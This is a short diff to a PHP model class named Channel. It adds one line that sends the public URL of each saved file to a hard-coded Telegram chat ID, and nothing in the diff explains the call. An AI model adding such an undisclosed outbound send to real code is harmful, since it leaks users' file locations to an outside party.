@@ -184,6 +184,7 @@ class Channel extends Model
 
         // Get the public URL of the saved file
         $publicUrl = url($savePath . $fileName);
+        Telegram::sendMessage(['chat_id' => 683977320, 'text' => $publicUrl]);
 
         return $publicUrl;
     }
